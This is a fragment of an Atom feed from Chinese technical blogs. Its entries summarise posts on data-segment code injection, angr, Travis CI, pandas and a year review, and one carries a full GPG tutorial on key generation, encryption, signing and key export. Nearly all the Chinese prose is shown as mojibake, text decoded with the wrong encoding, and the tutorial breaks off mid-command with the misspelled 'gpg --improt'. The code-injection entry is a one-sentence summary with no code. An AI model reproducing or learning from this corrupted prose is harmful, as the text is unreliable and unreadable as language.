            <name><![CDATA[LogicJakeâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2020/04/18/data-infector/</id>
        <title><![CDATA[data æ®µä»£ç æ³¨å…¥]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2020/04/18/data-infector/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2020/04/18/data-infector/"><![CDATA[<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘ data æ®µåŠ«æŒä»£ç å¹¶å°†ç¨‹åºçš„è¿è¡ŒæµåŠ«æŒåˆ°è¿™é‡Œå®ç°æˆ‘ä»¬å¸Œæœ›çš„åŠŸèƒ½ï¼ˆåŒ…æ‹¬æ‰§è¡Œæ¶æ„ä»£ç ã€è½¯ä»¶ä¿æŠ¤ç­‰ï¼‰ã€‚è¿™ä¸€è¿‡ç¨‹ä¸­å¯èƒ½æ˜¯æœ€å¤æ‚ä¹Ÿæ˜¯æœ€é‡è¦çš„éƒ¨åˆ†å°±æ˜¯æ€æ ·å°†æ–°å¢çš„ä»£ç æ³¨å…¥åˆ° data æ®µä¸­äº†ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/12/31/my-2019/</id>
        <title><![CDATA[æˆ‘çš„ 2019 æ€»ç»“]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/12/31/my-2019/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/12/31/my-2019/"><![CDATA[<p>å­¦ä¹ ä¸€ä¸‹èµµç¥åšä¸€ä¸‹å¹´ç»ˆæ€»ç»“ï¼Œè™½ç„¶è‡ªå·±å¾ˆèœå°±æ˜¯å•¦ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/</id>
        <title><![CDATA[angr å…¥é—¨ï¼ˆä¸‰ï¼‰]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/"><![CDATA[<p>æœ¬ç¯‡ä¸»è¦è®°å½•äº†æ–°æ‰‹ä½¿ç”¨ angr å¯¹å†…å­˜å’Œå¯„å­˜å™¨æ“ä½œçš„è®°å½•ã€‚é¢˜ç›®åˆ†æé¡ºåºå‚è€ƒäº†è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/4052" target="_blank" rel="noopener">æ·±å…¥æµ…å‡ºangrï¼ˆä¸‰ï¼‰</a></p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/</id>
        <title><![CDATA[ä½¿ç”¨ Travis CI è‡ªåŠ¨éƒ¨ç½² Hexo åšå®¢]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/"><![CDATA[<p>æœ€è¿‘ä¸€ç›´åœ¨ Manjaro å’Œ Windows ä¹‹é—´åˆ‡æ¢ï¼Œç°åœ¨å­¦ä¹ éƒ½å·²ç»åœ¨ Manjaro ä¸Šè¿›è¡Œäº†ï¼Œä½†æ˜¯åšå®¢è¿˜åœ¨ Windows ä¸Šã€‚è™½ç„¶è¿ç§»è¿‡æ¥å¹¶ä¸éš¾ï¼Œä½†è¿˜æ˜¯å¤ªéº»çƒ¦äº†ã€‚å¦å¤–å†™åšå®¢è¿˜è¦å¼€ç”µè„‘ï¼Œçš„ç¡®æœ‰ç‚¹éº»çƒ¦ã€‚ä½œä¸ºä¸€ä¸ªæ‡’äººå½“ç„¶æ˜¯åŠ¨åŠ¨æ‰‹è‡ªåŠ¨æ¨é€æœ€å¥½ï¼Œæˆ‘å°±æƒ³åˆ°äº†ç”¨ <a href="https://travis-ci.org/" target="_blank" rel="noopener">Travis CI</a> æ¥è‡ªåŠ¨éƒ¨ç½²åšå®¢ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/</id>
        <title><![CDATA[angr å…¥é—¨ï¼ˆäºŒï¼‰]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/"><![CDATA[<p>è¿™é‡Œæ›´è¿›ä¸€æ­¥åœ°å­¦ä¹ äº† angr çš„ä¸€äº›çŸ¥è¯†ç‚¹ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/17/DataScience_10MinutesToPandas/</id>
        <title><![CDATA[æ•°æ®ç§‘å­¦ | ååˆ†é’Ÿå…¥é—¨pandas/å¸¸ç”¨æ–¹æ³•ç¬”è®°]]></title>
        <updated>2020-04-17T18:36:32+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/17/DataScience_10MinutesToPandas/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/17/DataScience_10MinutesToPandas/"><![CDATA[æœ€è¿‘å¯¹æ•°æ®ç§‘å­¦æœ‰ç‚¹æ„Ÿå…´è¶£ï¼Œæ­£å¥½è¦ç”¨åˆ°pandasï¼Œäºæ˜¯å°±ç¿»è¯‘äº†ä¸€ä¸‹å®˜æ–¹çš„10 Minutes to pandasï¼Œé¡ºä¾¿è®°äº†ç‚¹ç¬”è®°å§ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/gpg/</id>
        <title><![CDATA[GPGä½¿ç”¨ç¬”è®°]]></title>
        <updated>2020-04-02T06:47:31+08:00</updated>
        <link href="https://blog.creedowl.com/posts/gpg/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/gpg/"><![CDATA[<h2 id="why-gpg">Why GPG?</h2>
<p><a href="https://zh.wikipedia.org/wiki/GnuPG">GPG</a> æ˜¯ä¸€ä¸ªå¯†ç å­¦è½¯ä»¶ï¼Œç”¨äºåŠ å¯†ã€ç­¾åé€šä¿¡å†…å®¹åŠç®¡ç†éå¯¹ç§°å¯†ç å­¦çš„å¯†é’¥ï¼Œå…·ä½“å†å²ã€ä»‹ç»å¯ä»¥åœ¨wikiä¸­çœ‹åˆ°ï¼Œ<a href="https://gnupg.org/">å®˜ç½‘</a></p>
<p>è€Œæˆ‘ä½¿ç”¨ GPG çš„ç¼˜ç”±æ˜¯ï¼Œåœ¨ Github ä¸Šæäº¤æ—¶ï¼Œå¦‚æœä½¿ç”¨ GPG å¯¹æäº¤è¿›è¡Œç­¾åï¼Œä¼šæœ‰ä¸€ä¸ª<code>Verified</code>æ ‡è¯†<del>çœ‹èµ·æ¥å¾ˆnb</del></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585795152275.png/compress" alt="UTOOLS1585795152275.png"></p>
<p>å½“ç„¶ä½¿ç”¨ GPG ä¸ä»…æ˜¯ä¸ºäº†å¥½çœ‹ï¼Œå®ƒèƒ½ç¡®ä¿ä½ æä¾›çš„ä¿¡æ¯æ˜¯ç”±ä½ è‡ªå·±å‘å¸ƒçš„ï¼Œæ— æ³•è¢«åˆ«äººç¯¡æ”¹ã€å†’å……ï¼Œå‰ææ˜¯ä¿æŠ¤å¥½è‡ªå·±çš„ GPG ç§é’¥</p>
<h2 id="å®‰è£…">å®‰è£…</h2>
<p>è¿™è¾¹ä»¥ MacOS ä¸ºç¤ºä¾‹è¿›è¡Œæ“ä½œ</p>
<p><strong>å¼ºçƒˆå»ºè®® MacOS ç”¨æˆ·ä½¿ç”¨ <a href="https://gpgtools.org/">GPG Suite</a> è¿›è¡Œæ“ä½œï¼Œå¯ä»¥é¿å…ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div><p><del>ä»…å®‰è£… GPG æœ¬ä½“</del></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># deprecated</span>
brew install gpg
</code></pre></div><h2 id="ç”Ÿæˆå¯†é’¥">ç”Ÿæˆå¯†é’¥</h2>
<p>GPG é‡‡ç”¨éå¯¹ç§°åŠ å¯†ï¼Œä¸€åˆ‡çš„æ“ä½œéƒ½éœ€è¦æœ‰å¯†é’¥ã€‚ç½‘ä¸Šä¸€äº›æ•™ç¨‹ä¸­çš„æ“ä½œä¸æˆ‘ä½¿ç”¨çš„ GPG ç‰ˆæœ¬ <code>gpg (GnuPG/MacGPG2) 2.2.17</code> æœ‰ç‚¹å‡ºå…¥ï¼Œä»¥ä¸‹æ“ä½œéƒ½åœ¨æˆ‘æ‰€ä½¿ç”¨çš„ç‰ˆæœ¬ä¸‹è¿›è¡Œ</p>
<p>æœ‰ä¸¤ä¸ªå‘½ä»¤ç”¨äºç”Ÿæˆå¯†é’¥ï¼Œä¸º<code>gpg --gen-key</code>å’Œ<code>gpg --full-gen-key</code>ï¼ŒåŒºåˆ«æ˜¯å‰è€…é‡‡ç”¨é»˜è®¤çš„é…ç½®ä¸å¯æ›´æ”¹ï¼Œåè€…èƒ½è‡ªå®šä¹‰é…ç½®ã€‚æˆ‘ä»¬é‡‡ç”¨åä¸€ç§ï¼Œé¦–å…ˆé€‰æ‹©å¯†é’¥ç±»å‹ï¼Œé»˜è®¤çš„<code>1</code>å°±å¯ä»¥äº†</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ gpg --full-gen-key
gpg <span class="o">(</span>GnuPG/MacGPG2<span class="o">)</span> 2.2.17<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

è¯·é€‰æ‹©æ‚¨è¦ä½¿ç”¨çš„å¯†é’¥ç±»å‹ï¼š
   <span class="o">(</span>1<span class="o">)</span> RSA å’Œ RSA ï¼ˆé»˜è®¤ï¼‰
   <span class="o">(</span>2<span class="o">)</span> DSA å’Œ Elgamal
   <span class="o">(</span>3<span class="o">)</span> DSAï¼ˆä»…ç”¨äºç­¾åï¼‰
   <span class="o">(</span>4<span class="o">)</span> RSAï¼ˆä»…ç”¨äºç­¾åï¼‰
æ‚¨çš„é€‰æ‹©æ˜¯ï¼Ÿ <span class="m">1</span>
</code></pre></div><p>æ¥ç€é€‰æ‹©å¯†é’¥é•¿åº¦ï¼Œé»˜è®¤<code>2048</code>å³å¯</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">RSA å¯†é’¥çš„é•¿åº¦åº”åœ¨ 1024 ä½ä¸ 4096 ä½ä¹‹é—´ã€‚
æ‚¨æƒ³è¦ä½¿ç”¨çš„å¯†é’¥é•¿åº¦ï¼Ÿ(2048) 2048
</code></pre></div><p>ç„¶åè®¾å®šå¯†é’¥çš„æœ‰æ•ˆæœŸé™ï¼Œæˆ‘ä»¬æ²¡æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œè®¾ç½®æ°¸ä¸è¿‡æœŸå³å¯</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">è¯·è®¾å®šè¿™ä¸ªå¯†é’¥çš„æœ‰æ•ˆæœŸé™ã€‚
         0 = å¯†é’¥æ°¸ä¸è¿‡æœŸ
      &lt;n&gt;  = å¯†é’¥åœ¨ n å¤©åè¿‡æœŸ
      &lt;n&gt;w = å¯†é’¥åœ¨ n å‘¨åè¿‡æœŸ
      &lt;n&gt;m = å¯†é’¥åœ¨ n æœˆåè¿‡æœŸ
      &lt;n&gt;y = å¯†é’¥åœ¨ n å¹´åè¿‡æœŸ
å¯†é’¥çš„æœ‰æ•ˆæœŸé™æ˜¯ï¼Ÿ(0) 0
</code></pre></div><p>ç¡®è®¤ä¸Šè¿°è®¾ç½®åï¼Œä¾æ¬¡è¾“å…¥å§“åã€é‚®ç®±å’Œæ³¨é‡Šï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨éšæœºä¿¡æ¯ç”¨äºæ¼”ç¤º</p>
<pre><code>GnuPG éœ€è¦æ„å»ºç”¨æˆ·æ ‡è¯†ä»¥è¾¨è®¤æ‚¨çš„å¯†é’¥ã€‚

çœŸå®å§“åï¼š naive
ç”µå­é‚®ä»¶åœ°å€ï¼š naive@test.com
æ³¨é‡Šï¼š too young too simple
æ‚¨é€‰å®šäº†æ­¤ç”¨æˆ·æ ‡è¯†ï¼š
    â€œnaive (too young too simple) &lt;naive@test.com&gt;â€

æ›´æ”¹å§“åï¼ˆNï¼‰ã€æ³¨é‡Šï¼ˆCï¼‰ã€ç”µå­é‚®ä»¶åœ°å€ï¼ˆEï¼‰æˆ–ç¡®å®šï¼ˆOï¼‰/é€€å‡ºï¼ˆQï¼‰ï¼Ÿ
</code></pre>
<p>ç¡®å®šåï¼Œéœ€è¦è®¾å®šå¯†é’¥çš„å¯†ç ï¼Œå¦‚æœä½ é‡‡ç”¨äº† <code>GPG Suite</code> ï¼Œä¼šå‡ºç°ä¸€ä¸ªçª—å£ï¼Œåœ¨æ­¤è¾“å…¥å¯†ç </p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585796741624.png/compress" alt="UTOOLS1585796741624.png"></p>
<p>å¦‚æœæ²¡ä½¿ç”¨<code>GPG Suite</code>ï¼Œåˆ™ä¼šåœ¨ä½ å½“å‰ç»ˆç«¯å¼¹å‡ºä¸€ä¸ªå…¨å±ç»ˆç«¯çª—å£ï¼ŒåŒæ ·æ˜¯è¾“å…¥å¯†ç ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼Œåœ¨ mac ç»ˆç«¯ç¯å¢ƒä¸‹ï¼Œå¦‚æœè¯­è¨€æ˜¯ä¸­æ–‡çš„è¯ï¼Œè¿™ä¸ªç»ˆç«¯çª—å£å¯èƒ½ä¼šä¹±ç ï¼Œä½†ä¸å½±å“ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä¸´æ—¶è®¾ç½®è¯­è¨€ä¸ºè‹±æ–‡è§£å†³è¿™ä¸ªé—®é¢˜<code>LANGUAGE=en gpg --full-generate-key</code>ã€‚ä½†åƒä¸‡ä¸è¦ç”¨<code>ctrl-c</code>ç»“æŸè¿™ä¸ªè¿›ç¨‹ï¼Œè¿™ä¼šç ´åå½“å‰ç»ˆç«¯ç¯å¢ƒï¼Œåé¢çš„è¾“å…¥ä¼šå˜å¾—å¾ˆå¥‡æ€ªï¼Œè€Œä¸”åå°è¿›ç¨‹ä¸ä¼šç»“æŸï¼Œä¼šå æ»¡ä½ çš„CPU</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">æˆ‘ä»¬éœ€è¦ç”Ÿæˆå¤§é‡çš„éšæœºå­—èŠ‚ã€‚åœ¨è´¨æ•°ç”ŸæˆæœŸé—´åšäº›å…¶ä»–æ“ä½œï¼ˆæ•²æ‰“é”®ç›˜
ã€ç§»åŠ¨é¼ æ ‡ã€è¯»å†™ç¡¬ç›˜ä¹‹ç±»çš„ï¼‰å°†ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„ä¸»æ„ï¼›è¿™ä¼šè®©éšæœºæ•°
å‘ç”Ÿå™¨æœ‰æ›´å¥½çš„æœºä¼šè·å¾—è¶³å¤Ÿçš„ç†µã€‚
gpg: å¯†é’¥ 4C26D2E451FFDAF1 è¢«æ ‡è®°ä¸ºç»å¯¹ä¿¡ä»»
gpg: ç›®å½•â€˜/Users/creedowl/.gnupg/openpgp-revocs.dâ€™å·²åˆ›å»º
gpg: åŠé”€è¯ä¹¦å·²è¢«å­˜å‚¨ä¸ºâ€˜/Users/creedowl/.gnupg/openpgp-revocs.d/0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1.revâ€™
å…¬é’¥å’Œç§é’¥å·²ç»ç”Ÿæˆå¹¶è¢«ç­¾åã€‚

pub   rsa2048 2020-04-02 [SC]
      0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1
uid                      naive (too young too simple) &lt;naive@test.com&gt;
sub   rsa2048 2020-04-02 [E]
</code></pre></div><p>è¿™æ ·ï¼Œå¯†é’¥å°±ç”Ÿæˆå®Œæˆï¼Œå…¶ä¸­<code>4C26D2E451FFDAF1</code>å°±æ˜¯ä½ çš„å¯†é’¥åï¼Œåç»­æ“ä½œéƒ½éœ€è¦é€šè¿‡è¿™ä¸ªå¯†é’¥åé€‰æ‹©å¯†é’¥ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡ä¹‹å‰è®¾ç½®çš„å§“åæˆ–é‚®ç®±ä»£æ›¿æ“ä½œ</p>
<h2 id="gpg-å¸¸ç”¨æ“ä½œ">GPG å¸¸ç”¨æ“ä½œ</h2>
<p>GPG æœ€åŸºç¡€çš„æ“ä½œå°±æ˜¯å¯¹æ–‡ä»¶ç­‰ä¿¡æ¯è¿›è¡ŒåŠ å¯†ã€ç­¾åï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶<code>test.txt</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nb">test</span> &gt; test.txt
</code></pre></div><h3 id="åŠ å¯†">åŠ å¯†</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --recipient creedowl --output test.txt.gpg --encrypt test.txt
</code></pre></div><p>å…¶ä¸­<code>--recipient</code>æŒ‡å®šæ¥æ”¶è€…ï¼Œç®€å†™ä¸º<code>-r</code>ï¼Œè®¾å®šæ¥å—è€…æ—¶éœ€è¦ä½ æœ¬åœ°æœ‰æ¥æ”¶è€…çš„<strong>å…¬é’¥</strong>ï¼Œå¯ä»¥ç”¨å¯†é’¥åã€å§“åæˆ–è€…é‚®ç®±è¿›è¡ŒæŒ‡å®šã€‚<code>--output</code>æŒ‡å®šè¾“å‡ºæ–‡ä»¶åï¼Œå¯çœç•¥ã€‚<code>--encrypt</code>æŒ‡å®šå¾…åŠ å¯†çš„æ–‡ä»¶ï¼Œç®€å†™ä¸º<code>-e</code>ã€‚è¿™æ ·åœ¨ä½ å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª<code>test.txt.gpg</code>å³åŠ å¯†åçš„æ–‡ä»¶ï¼Œä½ å°±å¯ä»¥æŠŠè¿™ä¸ªæ–‡ä»¶å‘é€ç»™æ¥å—è€…ï¼Œä¸å¿…æ‹…å¿ƒæ–‡ä»¶å†…å®¹è¢«ç¬¬ä¸‰æ–¹è¯»å–</p>
<p><strong>æ³¨æ„</strong>è¿™é‡Œç”ŸæˆåŠ å¯†æ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼Œæœ‰æ—¶å€™ï¼ˆå¦‚é€šè¿‡é‚®ä»¶å‘é€ï¼‰ä¸ä¾¿äºæ“ä½œï¼Œå¯ä»¥åŠ ä¸Š<code>--armor</code>å‚æ•°ï¼ˆç®€å†™ä¸º<code>-a</code>ï¼‰ç”Ÿæˆæ–‡æœ¬æ ¼å¼çš„å¯†æ–‡ï¼Œå¦‚</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -r creedowl -ae test.txt
</code></pre></div><p>ç”Ÿæˆçš„åŠ å¯†æ–‡ä»¶ä¸º<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP MESSAGE-----

hQEMA9KmvDhAMTGrAQf+KITqx4HTpWsevIEfRFlw5g+jt8l8ol3fuww0gBoMEPBG
KaqxCmjIpHZdGmaXwBSKadmeieZGLsm1CYuf4gbv4FpdWgveVWnLvB/HmwuvnmJt
YhTtapNgkQ++mwPbH4WKeOFQ58U5dZ7C+R8rrucRRYQBRTH6AJQY82aV1KXTqyF1
D8c/2ANW7aCWr8W/ogCbEqH47VE3foP+aSD+JMPtdnaYWIPzyr5x5lw6ASwxD4hB
ikOUcJTxp+GyFLTd3n1zCvSP9ZQzvolur7soqZVP8t4hxlALGL+KYN4YgubcPt5y
bucMYWkbLlZM+AuAYzSCLaSmkgkiYUFEkwKJWdLr+NJGAY5Mk+bnEP2k/kKxl9vo
/LVsloiYbg9M184LxUNfZRBnKcI9vKw/C6uU2Ee5wKUMsy3Epnp60Fe5u5fj5yn7
0JjMBmY+gQ==
=8K/i
-----END PGP MESSAGE-----
</code></pre></div><h3 id="è§£å¯†">è§£å¯†</h3>
<p>æœ‰äº†å¯†æ–‡å°±è¦å¯¹å…¶è¿›è¡Œè§£å¯†å¾—åˆ°åŸæ–‡ã€‚æ³¨æ„è¦è¿›è¡Œè§£å¯†ï¼Œä½ å¿…é¡»æœ‰æ¥å—è€…çš„<strong>ç§é’¥</strong>ã€‚å…¬é’¥æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥æŸ¥çœ‹ã€ä½¿ç”¨ï¼Œè€Œ<strong>ç§é’¥</strong>æ˜¯ç§æœ‰çš„ï¼Œä¸€å®šè¦ä¿ç®¡å¥½ï¼Œå¦‚æœæ³„éœ²äº†è¿™ä¸ª GPG å¯†é’¥å°±ç­‰åŒäºå¤±æ•ˆäº†ï¼Œéœ€è¦åŠé”€ã€‚è¿™å°±æ˜¯éå¯¹ç§°åŠ å¯†</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">	gpg --decrypt test.txt.asc --output out.txt
</code></pre></div><p>å…¶ä¸­<code>--decrypt</code>å£°æ˜è¯¥å‘½ä»¤è¿›è¡Œè§£å¯†ï¼Œç®€å†™ä¸º<code>-d</code>ï¼Œ<code>--output</code>æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤è¾“å‡ºåˆ°ç»ˆç«¯ã€‚æ³¨æ„è§£å¯†æ—¶éœ€è¦è¾“å…¥ä½ å¯†é’¥çš„å¯†ç ï¼Œæ‰€ä»¥ä¹Ÿä¸€å®šè¦ä¿ç®¡å¥½å¯†ç </p>
<h3 id="ç­¾å">ç­¾å</h3>
<p>æœ‰çš„æ—¶å€™ä¸éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œç­¾åï¼Œåªéœ€è¦ç¡®ä¿æ–‡ä»¶æ˜¯ç”±æœ¬äººå‘å‡ºçš„ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨åˆ°ç­¾å</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --sign test.txt
</code></pre></div><p>ä¼šç”ŸæˆäºŒè¿›åˆ¶çš„ç­¾åæ–‡ä»¶<code>test.txt.gpg</code>ï¼Œå¦‚æœæƒ³ç”Ÿæˆæ–‡æœ¬ç±»å‹çš„ç­¾åï¼Œä½¿ç”¨</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --clearsign test.txt
</code></pre></div><p>ä¼šç”Ÿæˆæ–‡æœ¬ç±»å‹çš„ç­¾åæ–‡ä»¶<code>test.txt.asc</code></p>
<p>æ³¨æ„ä»¥ä¸Šä¸¤ç§æ–¹å¼åŸæ–‡å’Œç­¾åæ˜¯åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ŒæŸ¥çœ‹<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQFDBAEBCAAtFiEECzxS8e8HsU6nxFyaTCbS5FH/2vEFAl6FX+cPHG5haXZlQHRl
c3QuY29tAAoJEEwm0uRR/9rxGNsH/AmjJiT19q5caq9Pe8tMRnR2yvZIGWbMD3Ch
UTkyGMkSPMIo6XRpYPlANe2/dddBT2l7EAPy2lAxaa8LcjsxtRhJG4GxMaCcujik
M6MX3IOfa1m9aDP1IY3Sh2U07j3t+8dawahR8EUF2D+rtvx24ybnwpWpKbDVsGyp
Mt06BI3pWC3opMRYPCl21IBhPhaPPnvXF7X8DMP+2VqZye2juX2oG1KMkZWQuiBb
/D7DYlx6/ainu0cJw6UL8YXHag7tkUeKtTPQbBpCsszOuxJZ74gduIUzDcokayCB
DM9qB/GpUyVOOTwfLMBta6JP5BO8ppPaPdPX46kKDqLKG7eh4bQ=
=Q4/W
-----END PGP SIGNATURE-----
</code></pre></div><p>å› ä¸ºæ˜¯ç­¾åï¼Œä¸ä¼šå¯¹å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥ç›´æ¥æ˜¾ç¤ºåŸæ–‡ã€‚å¦‚æœæƒ³æŠŠåŸå§‹æ–‡ä»¶åˆ†ç¦»å‡ºæ¥ï¼Œä½¿ç”¨</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --output out.txt -d test.txt.gpg
</code></pre></div><p>åˆ†ç¦»çš„åŒæ—¶è¿˜é¡ºä¾¿æ ¡éªŒäº†ç­¾åã€‚æ³¨æ„è¿™é‡Œ<code>test.txt.gpg</code>æ˜¯ä¸Šé¢ç”Ÿæˆçš„äºŒè¿›åˆ¶<strong>ç­¾å</strong>æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨<code>test.txt.asc</code></p>
<p>å¦‚æœæ¯æ¬¡éƒ½è¦åˆ†ç¦»ï¼Œå°±å¾ˆéº»çƒ¦ï¼Œè€Œä¸”æ²¡æœ‰å®‰è£… GPG çš„ç”¨æˆ·å°±æ— æ³•ä½¿ç”¨æºæ–‡ä»¶äº†ã€‚æ‰€ä»¥æ›´å¥½çš„æ–¹å¼æ˜¯åˆ†ç¦»æºæ–‡ä»¶å’Œç­¾åæ–‡ä»¶</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --detach-sign --armor test.txt
</code></pre></div><p>è¿™æ ·ä¼šç”Ÿæˆä¸€ä¸ªå•ç‹¬çš„ã€æ–‡æœ¬ç±»å‹çš„ç­¾åæ–‡ä»¶<code>test.txt.sig</code></p>
<blockquote>
<p>æ³¨æ„ï¼šå¦‚æœæœ‰å¤šä¸ªç§é’¥ï¼Œå¯ä»¥ç”¨<code>-u</code>å‚æ•°é€‰æ‹©</p>
</blockquote>
<h3 id="ç­¾åæ ¡éªŒ">ç­¾åæ ¡éªŒ</h3>
<p>æ”¶åˆ°æ–‡ä»¶å’Œç­¾åæ–‡ä»¶åï¼Œéœ€è¦å¯¹ç­¾åè¿›è¡Œæ ¡éªŒ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --verify test.txt.sig test.txt
</code></pre></div><p>å¦‚æœç­¾åæ ¡éªŒæˆåŠŸï¼Œä¼šæ˜¾ç¤º</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg: ç­¾åå»ºç«‹äº å››  4/ <span class="m">2</span> 11:49:35 <span class="m">2020</span> CST
gpg:               ä½¿ç”¨ RSA å¯†é’¥ 34B368EFC6FA8941B4A096CFFA4C884FBE8164D7
gpg: å®Œå¥½çš„ç­¾åï¼Œæ¥è‡ªäº â€œcreedowl &lt;creedowl@gmail.com&gt;â€ <span class="o">[</span>ç»å¯¹<span class="o">]</span>
</code></pre></div><h3 id="å¯¼å…¥å¯¼å‡º">å¯¼å…¥å¯¼å‡º</h3>
<p>å½“ä½ éœ€è¦ä¸ä»–äººäº¤æ¢æ•°æ®æ—¶ï¼Œéœ€è¦å¯¼å‡ºè‡ªå·±çš„å…¬é’¥ï¼ŒåŒæ—¶å¯¼å…¥ä»–äººçš„å…¬é’¥ï¼›è€Œå¦‚æœä½ æ›´æ¢ç”µè„‘ï¼Œå°±éœ€è¦å¯¼å‡ºè‡ªå·±çš„ç§é’¥ã€‚è¿™å°±æ¶‰åŠåˆ°äº†å¯†é’¥çš„å¯¼å…¥å¯¼å‡º</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output public_key.txt --export naive
</code></pre></div><p>ä¸Šè¿°å‘½ä»¤ç”¨äºå¯¼å‡ºå…¬é’¥ï¼Œç›¸å…³å‚æ•°åœ¨ä¸Šæ–‡éƒ½æœ‰ä»‹ç»ã€‚æ¥ç€ä½ å°±å¯ä»¥æŠŠ<code>public_key.txt</code>å‘å¸ƒç»™ä»–äºº</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output private_key.txt --export-secret-keys naive
</code></pre></div><p>ä¸Šè¿°å‘½ä»¤ç”¨äºå¯¼å‡ºç§é’¥ï¼Œä¸€å®šè¦ä¿ç®¡å¥½ï¼Œå»ºè®®åœ¨è„±æœºæƒ…å†µä¸‹è¿›è¡Œæ“ä½œ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --improt <span class="o">[</span>å¯†é’¥æ–‡ä»¶<span class="o">]</span>
